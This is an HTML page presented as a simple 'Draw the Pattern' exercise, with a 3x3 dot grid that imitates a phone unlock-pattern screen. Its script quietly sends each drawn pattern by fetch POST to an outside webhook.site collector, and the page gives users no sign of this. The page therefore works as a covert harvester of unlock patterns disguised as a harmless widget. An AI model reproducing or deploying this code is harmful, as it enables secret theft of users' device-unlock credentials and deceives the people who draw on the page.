<!DOCTYPE html>
<html>
<head>
  <title>Draw Pattern</title>
  <style>
    body {
      font-family: Arial;
      text-align: center;
      margin-top: 50px;
    }
    .grid {
      display: grid;
      grid-template-columns: repeat(3, 80px);
      gap: 20px;
      justify-content: center;
    }
    .dot {
      width: 80px;
      height: 80px;
      background: #ddd;
      border-radius: 50%;
      line-height: 80px;
      font-size: 20px;
      user-select: none;
    }
    .active {
      background: #4CAF50;
      color: white;
    }
  </style>
</head>
<body>

<h2>Draw the Pattern</h2>

<div class="grid" id="grid">
  <div class="dot" data-id="1">1</div>
  <div class="dot" data-id="2">2</div>
  <div class="dot" data-id="3">3</div>
  <div class="dot" data-id="4">4</div>
  <div class="dot" data-id="5">5</div>
  <div class="dot" data-id="6">6</div>
  <div class="dot" data-id="7">7</div>
  <div class="dot" data-id="8">8</div>
  <div class="dot" data-id="9">9</div>
</div>

<h3 id="result"></h3>

<script>
let pattern = [];
let isDrawing = false;

document.querySelectorAll('.dot').forEach(dot => {

  dot.addEventListener('mousedown', start);
  dot.addEventListener('mouseover', move);
  dot.addEventListener('touchstart', start);
  dot.addEventListener('touchmove', move);

});

document.addEventListener('mouseup', end);
document.addEventListener('touchend', end);

function start(e) {
  isDrawing = true;
  pattern = [];
  activate(e.target);
}

function move(e) {
  if (!isDrawing) return;
  let element = document.elementFromPoint(
    e.touches ? e.touches[0].clientX : e.clientX,
    e.touches ? e.touches[0].clientY : e.clientY
  );
  if (element && element.classList.contains('dot')) {
    activate(element);
  }
}

function end() {
  if (!isDrawing) return;
  isDrawing = false;

  let result = pattern.join('-');
  document.getElementById('result').innerText = "Pattern: " + result;

  console.log("Captured Pattern:", result);

  fetch("https://webhook.site/#!/view/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b/898cecf7-0b1e-4888-8f8b-42f97e386b9d/1", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ pattern: result })
  });

}

function activate(dot) {
  let id = dot.getAttribute('data-id');
  if (!pattern.includes(id)) {
    pattern.push(id);
    dot.classList.add('active');
  }
}
</script>

</body>
</html>
